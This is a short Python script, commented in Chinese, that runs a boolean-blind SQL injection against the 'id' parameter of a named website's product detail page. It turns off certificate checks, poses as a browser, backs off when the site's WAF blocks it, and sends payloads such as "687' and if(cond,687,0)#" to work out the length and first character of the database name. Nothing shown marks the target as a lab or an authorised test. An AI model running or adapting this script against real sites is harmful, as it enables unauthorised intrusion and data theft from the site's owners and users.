#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(3):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(2); continue
        if 'WTS-WAF' in b:
            time.sleep(3); continue
        if 'Invalid SQL' in b:
            return None
        return TRUE_MARK in b
    return None

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(0.4)
    return r

# 测 database() 长度 1-20
print('=== database() 长度 ===')
for n in range(1, 21):
    r = test("length(database())=%d" % n)
    if r is True:
        print('database() 长度 = %d' % n)
        break
    if n % 5 == 0:
        print('  ...测到%d' % n)

# 测首字符(大写+小写+数字+常见)
print('=== database() 首字符(扩展字符集) ===')
import string
charset = string.ascii_letters + string.digits + '_'
for ch in charset:
    r = test("ascii(substr(database(),1,1))=%d" % ord(ch))
    if r is True:
        print('首字符 = %r (ascii %d)' % (ch, ord(ch)))
        break
else:
    print('未找到首字符(可能非ASCII或注入点另有蹊跷)')
